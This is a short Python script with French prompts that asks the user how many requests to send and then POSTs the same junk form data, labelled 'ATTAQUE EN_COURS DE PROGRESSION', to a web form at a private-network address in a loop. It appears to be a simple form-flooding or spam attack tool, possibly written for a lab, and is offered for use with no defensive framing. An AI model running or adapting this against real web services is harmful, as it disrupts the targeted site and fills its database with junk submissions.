from urllib import request, parse
import threading
from colorama import Fore, Style, init

data = parse.urlencode({"nom": "ATTAQUE", "prenom":"" ,"email": "EN_COURS", "phone": "DE", "message": "PROGRESSION", "question":"blanc"}).encode("utf8")

nb_envois = int(input("Combien voulez vous envoyer de requete : "))

for i in range(nb_envois):
    res = request.urlopen("http://192.168.190.8:8000", data=data).read()
    page = res.decode("utf8")
    print('requete envoyer')
